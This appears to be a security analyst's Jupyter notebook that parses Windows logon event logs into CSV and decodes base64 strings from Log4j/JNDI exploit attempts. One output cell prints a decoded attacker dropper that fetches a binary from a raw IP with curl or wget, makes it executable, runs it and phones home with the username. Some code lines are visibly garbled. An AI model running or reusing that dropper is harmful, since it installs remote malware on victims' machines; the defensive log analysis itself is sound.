# %%
import re
from pprint import pprint

file = 'sample.xml'

f1 = lambda x: re.compile(fr'<{x}>(?P<{x}>[^<]*)')
f2 = lambda x: re.compile(fr'<Data Name="{x}"[^>]*>(?P<{x}>[^<]*)</Data>')

ps = {'EventID' : f1('EventID')
     , 'Result' : f1('Result')
     , 'SystemTime' : re.compile(r'<TimeCreated SystemTime="(?P<SystemTime>[^"]*)"\/>')
     , 'IpAddress' : f2('IpAddress')
     , 'IpPort' : f2('IpPort')
     , 'TargetUserName' : f2('TargetUserName')
     , 'TargetDomainName' : f2('TargetDomainName')
     , 'LogonType' : f2('LogonType')}

# %%
lines = [ x.strip() for x in open(file, 'r').readlines()]

# %%
def parse(line, ps, key):
    m = ps[key].search(line)
    
    v = m.group(key) if m else ""
    if not ' ' in v:
        v = '"' + v + '"'
    return v

# %%
results = []
for line in lines:
    result = []
    for p in ps:
        result.append(parse(line, ps, p))
#     results.append(','.join([ '"' + x + '"' for x in result ]))
    if len(resultresults.append(','.join([ x for x in result ]))
pprint(results)
# Out:
# [',,,,,,,',
#  '4634,Audit '
#  'Success,2020-12-31T23:57:58.308884000Z,10.67.15.119,50272,W2UA8342BC8$,SVC,3',
#  '4634,Audit '
#  'Success,2020-12-31T23:57:58.308885000Z,10.67.33.97,54622,W2UA7191Y7X$,SVC,3',
#  '4634,Audit '
#  'Success,2020-12-31T23:57:58.308886000Z,10.65.166.46,61044,N7PQWMQ2$,SVC,3',
#  '4624,Audit '
#  'Success,2020-12-31T23:57:58.312874000Z,10.67.44.246,52263,WMXL81523CW$,SVC,3',
#  '4634,Audit '
#  'Success,2020-12-31T23:57:58.320661000Z,10.67.44.126,57600,WMXL8391S5L$,SVC,3',
#  '4624,Audit '
#  'Success,2020-12-31T23:57:58.320662000Z,10.67.15.119,50272,W2UA8342BC8$,SVC,3',
#  '4624,Audit '
#  'Success,2020-12-31T23:57:58.320663000Z,10.67.33.97,54622,W2UA7191Y7X$,SVC,3',
#  '4634,Audit '
#  'Success,2020-12-31T23:57:58.324881000Z,10.67.44.246,52263,WMXL81523CW$,SVC,3',
#  '4634,Audit '
#  'Success,2020-12-31T23:57:58.328875000Z,10.67.15.119,50272,W2UA8342BC8$,SVC,3',
#  ',,,,,,,']

# %%
results = []
quote = lambda x: f'"{x}"' if ' ' in x else x
for l in lines:
    result = []
    for p in ps:
        
        m = ps[p].search(l)
        if m:
            v = m.group(p) 
            result.append(quote(m.group(p)))
    if len(result)>0:
        x = ','.join(result)
        print(x)
        results.append(','.join(result))
# Out:
# 4634,"Audit Success",2020-12-31T23:57:58.308884000Z,10.67.15.119,50272,W2UA8342BC8$,SVC,3
# 4634,"Audit Success",2020-12-31T23:57:58.308885000Z,10.67.33.97,54622,W2UA7191Y7X$,SVC,3
# 4634,"Audit Success",2020-12-31T23:57:58.308886000Z,10.65.166.46,61044,N7PQWMQ2$,SVC,3
# 4624,"Audit Success",2020-12-31T23:57:58.312874000Z,10.67.44.246,52263,WMXL81523CW$,SVC,3
# 4634,"Audit Success",2020-12-31T23:57:58.320661000Z,10.67.44.126,57600,WMXL8391S5L$,SVC,3
# 4624,"Audit Success",2020-12-31T23:57:58.320662000Z,10.67.15.119,50272,W2UA8342BC8$,SVC,3
# 4624,"Audit Success",2020-12-31T23:57:58.320663000Z,10.67.33.97,54622,W2UA7191Y7X$,SVC,3
# 4634,"Audit Success",2020-12-31T23:57:58.324881000Z,10.67.44.246,52263,WMXL81523CW$,SVC,3
# 4634,"Audit Success",2020-12-31T23:57:58.328875000Z,10.67.15.119,50272,W2UA8342BC8$,SVC,3

# %%
import base64
def d64(x):
    ''' d(b64)-->decodes base64 byte string. =Nan if there's an error
    '''
    try:
        r = base64.b64decode(x, altchars="-_").decode()
    except:
        r = np.nan
    return r

# %%
d64(b'')
# Out:
# '(curl -fsSL http://185.250.148.157:8005/index||wget -q -O - http://185.250.148.157:8005/index) > /var/tmp/12\nchmod 777 /var/tmp/12\ncd /var/tmp\n./12\n(wget http://185.250.148.157:8005/Linux$(whoami)||curl  http://185.250.148.157:8005/Linux$(whoami)'

# %%
# %%python - ../log4j/all_jndi_payloads_2021.csv -o all_jndi_hits_2021.csv --dedup
# import argparse
#
# class Myopt():
#     def __init__(self, args=None):
#
#         self.description = '''Parse ip and hosts from file'''
#         self.p = argparse.ArgumentParser(description=self.description)
#         add = self.p.add_argument
#         add("fn", help="Input file containing ip and hosts")
#         add("--dedup", action="store_true", help="Deduplicate output")
#         add("-o", "--output", help="Output file for time, host", default="log4j_hosts.csv")
#         if args:
#             self.opt = self.p.parse_args(args)
#         else:
#             self.opt = self.p.parse_args()
#     def dedup(self):
#         return self.opt.dedup
#
# myopt = Myopt()
# opt = myopt.opt
#
# if opt.dedup:
#     print(f"{opt.output=}")
#
# if myopt.dedup:
#     print(f"{opt.fn=}")
#
# print(f"{opt.dedup=} {opt.output=} {opt.fn=}")
# with open(opt.fn) as f:
#     pass
# Out:
# opt.output='all_jndi_hits_2021.csv'
# opt.fn='../log4j/all_jndi_payloads_2021.csv'
# opt.dedup=True opt.output='all_jndi_hits_2021.csv' opt.fn='../log4j/all_jndi_payloads_2021.csv'

# %%
# !ls ../log4j
# Out:
# Log4Shell_Detecting_Log4j_2_RCE_Using_Splunk.pdf
# __init__.py
# all_jndi_hits_2021.csv
# all_jndi_payloads_2021.csv
# decode_log64_attempts.12-13-2012.csv
# decode_log64_attempts.12-22-2012.csv
# hits.20211210.csv
# hits.20211230.csv
# log4j.ipynb
# log4j_hosts.csv.bak
# log4j_hosts_20211209-20211213.csv
# log4j_hosts_20211214-20211226.csv
# log64_attempts.12-13-2012.csv
# parse_ip_from_payload.ipynb
# parse_ip_from_payload.py
# parse_raw_payload.py
# plot_count_events_by_date.py
# plot_frequency_risky_ips.py
# search_log4j.csv
# search_log4j.txt
# search_log4j_20211209-20211213.txt
# search_log4j_20211214-20211226.txt
# search_log4j_distinct.txt
# search_log4j_payload.py
# view.csv

# %%
import pandas as pd
df = pd.DataFrame({'rate' : [.25, .5, .75], 'amount' : [2108.82, 4004.08, 5716.67]}, index=None)
df = pd.DataFrame({'rate' : [.25, .5, .75], 'amount' : [2108.82, 4004.08, 5716.67]}, index=None)

# %%
df
# Out:
#    rate   amount
# 0  0.25  2108.82
# 1  0.50  4004.08
# 2  0.75  5716.67

# %%
# %matplotlib notebook
import matplotlib.pyplot as plt
import mplcursors
plt.plot(df.rate, df.amount)
mplcursors.cursor(hover=True)
# Out:
# <img src="data:image/png;base64,..." width="640">
